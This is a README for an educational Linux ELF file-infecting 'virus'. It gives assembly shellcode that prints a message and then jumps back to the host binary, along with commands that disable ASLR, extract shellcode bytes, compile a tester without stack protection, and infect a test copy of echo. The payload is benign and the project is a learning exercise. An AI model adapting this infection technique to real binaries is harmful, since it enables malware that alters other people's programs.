# Easy virus (virus)

```sh
    MVladislav
```

> Short **virus**, which will **add a text** into any random
> **binary** within the **same directory** as the **virus** runs.</br>
> Files will be **infected only once**.
>
> When the binary start:
>
> > First will be printed this added text, </br>
> > and then will run the original binary.

---

<!-- TOC -->

- [Easy virus (virus)](#easy-virus-virus)
  - [Things and so on](#things-and-so-on)
    - [disable randomization](#disable-randomization)
    - [how to convert assembler code for code as hex and run](#how-to-convert-assembler-code-for-code-as-hex-and-run)
  - [Hints](#hints)
  - [hay-code](#hay-code)

<!-- /TOC -->

---

## Things and so on

### disable randomization

- `$echo 0 > /proc/sys/kernel/randomize_va_space`

### how to convert assembler code for code as hex and run

- generate x64 a "hay-code" as hex for injecting target files
  - ```sh
    nasm -f elf64 -o iAmRoot.o iAmRoot.asm
    ld -o iAmRoot iAmRoot.o
    objdump -D iAmRoot > iAmRoot.txt
    echo `objdump -d iAmRoot | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}\$'` | nawk '{for(;++i<=NF;) printf(",0x%s%c", $i, (i%1)?"":(i==NF)?ORS:OFS)}'
    ```
- copy and run to infect test file(s)
  > copy any test file (like `echo`) into same folder as the `virus`
  >
  > and run the `virus`
  - ```sh
    sudo cp /bin/echo test_echo
    sudo chown $USER:$USER test_echo
    make
    ./virus
    ```

## Hints

- from dump as "\x"-hex written
  - `for i in`objdump -d iAmRoot | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}\$' `; do echo -n "\\x$i" ; done ; echo -e "\n"`
- from dump as space splitted written
  - `for i in`objdump -d iAmRoot | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}\$' `; do echo -n "$i " ; done ; echo -e "\n"`
  - `echo`objdump -d iAmRoot | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}\$'`| nawk '{for(;++i<=NF;) printf("%s%c", $i, (i%2)?"":(i==NF)?ORS:OFS)}'`
- for testing shellcode with C
  - `gcc shellcodetester.c -fno-stack-protector -z execstack -o shellcodetester`

## hay-code

```asm
; iAmRoot.asm
; author: MVladislav
; print Hey! I am an elf virus ;-)!\n and jump back
; jmp address `0xcf73` is only a placeholder
;   will be calculated and replaced in code

section .text
  global iAmRoot

  iAmRoot:
    push    rax ; %rax %eax %ax %al
    push    rdi ; %rdi %edi %di %dil
    push    rsi ; %rsi %esi %si %sil
    push    rdx ; %rdx %edx %dx %dl

    xor     rdi, rdi
    mov     dil, 1
    xor     rax, rax
    mov     al, 1
    xor     rsi, rsi
    mov     rsi, 0x0a21292d3b207375 ; "us ;-)!\n" is stored in reverse order "..."
    push    rsi
    mov     rsi, 0x72697620666c6520 ; " elf vir" is stored in reverse order "..."
    push    rsi
    mov     rsi, 0x6e61206d61204920 ; " I am an" is stored in reverse order "..."
    push    rsi
    mov     rsi, 0x2179654800000000 ; "Hey!" is stored in reverse order "..."
    push    rsi

    mov     rsi, rsp
    xor     rdx, rdx
    mov     dl, 32
    syscall

    pop    rsi
    pop    rsi
    pop    rsi
    pop    rsi

    pop     rdx
    pop     rsi
    pop     rdi
    pop     rax
    jmp     0xcf73
```
